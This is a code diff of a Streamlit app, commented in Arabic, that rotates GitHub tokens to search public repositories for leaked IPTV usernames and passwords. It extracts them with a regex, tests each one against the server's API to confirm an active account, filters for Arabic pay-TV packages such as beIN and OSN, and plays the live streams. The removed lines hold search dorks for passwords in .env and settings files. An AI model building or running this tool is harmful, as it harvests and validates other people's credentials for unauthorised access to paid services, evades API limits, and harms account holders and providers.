@@ -2,113 +2,151 @@ import streamlit as st
 import requests
 import re
 import time
-from datetime import datetime
+import threading
 
-# إعدادات الواجهة
-st.set_page_config(page_title="BEAST V32 - NUCLEAR SCAN", layout="wide")
+# --- إعدادات BEAST V33 ---
+st.set_page_config(page_title="BEAST V33 - ARABIC MONSTER", layout="wide")
 
+if "hits" not in st.session_state: st.session_state.hits = []
 if "auth" not in st.session_state: st.session_state.auth = False
+
+# نظام الدخول
 if not st.session_state.auth:
-    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V32 - THE FINAL BYPASS</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V33 - ARABIC MONSTER</h1>", unsafe_allow_html=True)
     pwd = st.text_input("Password:", type="password")
-    if st.button("دخول"):
+    if st.button("Unlock System"):
         if pwd == "BEAST_V17_PRO":
             st.session_state.auth = True
             st.rerun()
     st.stop()
 
-# ستايل الهكر المرعب
+# تصميم الواجهة (Dark Mode Pro)
 st.markdown("""
 <style>
-    .stApp { background-color: #000; }
-    .terminal-text { color: #00ff41; font-family: 'Courier New', Courier, monospace; font-size: 12px; }
+    .stApp { background-color: #050505; color: white; }
     .hit-card { 
-        background: #0a0a0a; border: 1px double #00ff41; 
-        padding: 15px; border-radius: 5px; margin-bottom: 10px;
-        box-shadow: 0px 0px 10px #00ff4133;
+        background: #0d1117; border: 1px solid #30363d; 
+        padding: 15px; border-radius: 10px; margin-bottom: 10px;
+        border-right: 5px solid #00ff41;
     }
+    .package-badge { background: #ff4b4b; color: white; padding: 2px 8px; border-radius: 5px; font-size: 12px; margin-left: 5px; }
+    .server-link { color: #58a6ff; text-decoration: none; font-family: monospace; }
 </style>
 """, unsafe_allow_html=True)
 
-with st.sidebar:
-    st.title("🚀 BEAST V32 NUCLEAR")
-    tokens_raw = st.text_area("أدخل التوكنات (واحد في كل سطر):", height=150)
-    tokens_list = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
-    
-    st.subheader("🎯 إعدادات الاستهداف")
-    target_word = st.text_input("بحث عن باقة معينة (مثلاً: bein):", "")
-    depth = st.slider("عمق البحث في الصفحات:", 5, 50, 20)
-    
-    start_btn = st.button("🔥 إطلاق الهجوم الشامل")
-
-# مساحات العرض
-log_area = st.empty()
-hits_area = st.container()
-
-if start_btn and tokens_list:
-    # دروكات "خبيثة" ومختلفة تماماً لزيادة النتائج
-    mega_dorks = [
-        f'"{target_word}" "get.php?username=" "password="' if target_word else 'extension:txt "get.php?username="',
-        'extension:m3u "http://" "username=" "password="',
-        'filename:settings.json "server_url" "password"',
-        'filename:.env "XTREAM_USER"',
-        'path:etc/php "username=" "password=" "http"',
-        'extension:log "player_api.php" "password="'
+# --- المحرك القناص ---
+def arabic_hunter(tokens, pages):
+    # كلمات بحث تستهدف المحتوى العربي تحديداً
+    arabic_targets = ["beIN", "SSC", "SHAHID", "OSN", "MY_HD", "ARABIC", "NILESAT"]
+    base_queries = [
+        'get.php?username=', 
+        'player_api.php?username=',
+        'extension:m3u "http://"'
     ]
     
-    found_hits = 0
-    t_idx = 0 # مؤشر التوكنات
+    t_count = len(tokens)
+    t_idx = 0
     
-    for dork in mega_dorks:
-        for page in range(1, depth + 1):
-            # تبديل التوكن لكل صفحة لزيادة السرعة وتجنب الحظر
-            current_token = tokens_list[t_idx % len(tokens_list)]
-            headers = {'Authorization': f'token {current_token}', 'Accept': 'application/vnd.github.v3+json'}
-            
-            try:
-                log_area.markdown(f"<p class='terminal-text'>[SYSTEM] Using Token: {current_token[:10]}... | Dork: {dork[:30]} | Page: {page}</p>", unsafe_allow_html=True)
-                
-                # البحث باستخدام معايير مختلفة (sort by indexed لضمان السيرفرات الجديدة)
-                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
-                response = requests.get(search_url, headers=headers).json()
-                
-                if "items" not in response:
-                    t_idx += 1 # التوكن ده تعب، خش على اللي بعده
-                    time.sleep(1)
+    for target in arabic_targets:
+        for query in base_queries:
+            full_dork = f'{query} "{target}"'
+            for page in range(1, pages + 1):
+                headers = {'Authorization': f'token {tokens[t_idx % t_count]}', 'Accept': 'application/vnd.github.v3+json'}
+                try:
+                    search_url = f"https://api.github.com/search/code?q={full_dork}&page={page}&per_page=100&sort=indexed"
+                    res = requests.get(search_url, headers=headers).json()
+                    
+                    if "items" not in res:
+                        t_idx += 1 # التبديل للتوكن التالي عند الحظر
+                        continue
+                    
+                    for item in res['items']:
+                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
+                        content = requests.get(raw_url, timeout=2).text
+                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
+                        
+                        for host, user, pw in matches:
+                            if any(h['host'] == host and h['user'] == user for h in st.session_state.hits): continue
+                            
+                            try:
+                                # فحص السيرفر ومحتواه العربي
+                                api = f"{host}/player_api.php?username={user}&password={pw}"
+                                check = requests.get(api, timeout=2).json()
+                                
+                                if check.get("user_info", {}).get("status") == "Active":
+                                    # جلب القوائم للتأكد من وجود باقات عربية
+                                    cats = requests.get(f"{api}&action=get_live_categories", timeout=2).json()
+                                    cat_names = [c['category_name'] for c in cats] if isinstance(cats, list) else []
+                                    
+                                    # فلترة: هل يحتوي فعلاً على محتوى عربي؟
+                                    found_ar = [name for name in cat_names if any(word in name.upper() for word in arabic_targets)]
+                                    
+                                    st.session_state.hits.append({
+                                        "host": host, "user": user, "pw": pw,
+                                        "cats": cat_names[:10],
+                                        "ar_cats": found_ar[:3]
+                                    })
+                            except: continue
+                except: 
+                    t_idx += 1
                     continue
 
-                for item in response['items']:
-                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
-                    try:
-                        file_content = requests.get(raw_url, timeout=2).text
-                        # Regex احترافي بيجيب السيرفر حتى لو في وسط كلام كتير
-                        links = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", file_content)
-                        
-                        for host, user, pw in links:
-                            try:
-                                # فحص السيرفر
-                                check_api = f"{host}/player_api.php?username={user}&password={pw}"
-                                res_check = requests.get(check_api, timeout=2).json()
-                                
-                                if res_check.get("user_info", {}).get("status") == "Active":
-                                    # جلب القنوات للتأكد من المحتوى
-                                    cat_req = requests.get(f"{check_api}&action=get_live_categories", timeout=2).json()
-                                    cat_names = [c['category_name'] for c in cat_req[:5]] if isinstance(cat_req, list) else ["No Data"]
-                                    
-                                    found_hits += 1
-                                    with hits_area:
-                                        st.markdown(f"""
-                                        <div class="hit-card">
-                                            <span style="color:#00ff41; font-weight:bold;">🏆 HIT #{found_hits}</span> | <code style="color:white;">{host}</code><br>
-                                            <span style="color:#fbbf24;">USER: {user} | PASS: {pw}</span><br>
-                                            <div style="color:#888; font-size:11px; margin-top:5px;">
-                                                <b>📦 القوائم:</b> {' | '.join(cat_names)}
-                                            </div>
-                                        </div>
-                                        """, unsafe_allow_html=True)
-                            except: continue
-                    except: continue
-            except: 
-                t_idx += 1
-                continue
-    log_area.success("✅ اكتمل الهجوم. راجع النتائج أعلاه.")
+# --- الواجهة ---
+with st.sidebar:
+    st.title("⚙️ BEAST V33 CONTROL")
+    tokens_input = st.text_area("أدخل التوكنات (واحد في كل سطر):", height=150)
+    pages_to_scan = st.slider("عمق البحث (صفحات لكل توكن):", 5, 100, 20)
+    
+    if st.button("🚀 بدء الهجوم العربي الشامل"):
+        t_list = [t.strip() for t in tokens_input.split('\n') if t.strip()]
+        if t_list:
+            threading.Thread(target=arabic_hunter, args=(t_list, pages_to_scan), daemon=True).start()
+            st.success("تم إطلاق المحرك في الخلفية...")
+        else: st.error("أدخل توكنات!")
+
+# --- عرض النتائج والمشغل ---
+st.subheader(f"📊 السيرفرات المكتشفة: {len(st.session_state.hits)}")
+
+# تقسيم الشاشة: النتائج على اليمين، المشغل على اليسار
+col_res, col_play = st.columns([1, 1.2])
+
+with col_res:
+    for idx, srv in enumerate(reversed(st.session_state.hits)):
+        with st.container():
+            st.markdown(f"""
+            <div class="hit-card">
+                <span class="server-link">{srv['host']}</span><br>
+                <small>User: {srv['user']} | Pass: {srv['pw']}</small><br>
+                <div style="margin-top:5px;">
+                    {" ".join([f"<span class='package-badge'>{c}</span>" for c in srv['ar_cats']])}
+                </div>
+                <p style="font-size:10px; color:#888; margin-top:5px;">📁 قوائم أخرى: {' | '.join(srv['cats'])}</p>
+            </div>
+            """, unsafe_allow_html=True)
+            if st.button(f"📺 تشغيل السيرفر #{len(st.session_state.hits)-idx}", key=f"btn_{idx}"):
+                st.session_state.active_srv = srv
+
+with col_play:
+    if "active_srv" in st.session_state:
+        s = st.session_state.active_srv
+        st.info(f"اتصال نشط بـ: {s['host']}")
+        
+        # جلب القنوات
+        try:
+            api_ch = f"{s['host']}/player_api.php?username={s['user']}&password={s['pw']}&action=get_live_streams"
+            streams = requests.get(api_ch, timeout=5).json()
+            
+            search_ch = st.text_input("🔍 بحث عن قناة عربية (OSN, beIN...):")
+            
+            st.markdown("<div style='height:400px; overflow-y:auto; background:#111; padding:10px;'>", unsafe_allow_html=True)
+            for ch in streams:
+                if search_ch.lower() in ch['name'].lower():
+                    if st.button(f"▶ {ch['name']}", key=f"ch_{ch['stream_id']}", use_container_width=True):
+                        st.session_state.current_url = f"{s['host']}/live/{s['user']}/{s['pw']}/{ch['stream_id']}.ts"
+            st.markdown("</div>", unsafe_allow_html=True)
+            
+            if "current_url" in st.session_state:
+                st.video(st.session_state.current_url)
+                st.code(st.session_state.current_url)
+        except:
+            st.error("السيرفر لا يستجيب لطلبات البث المباشر.")
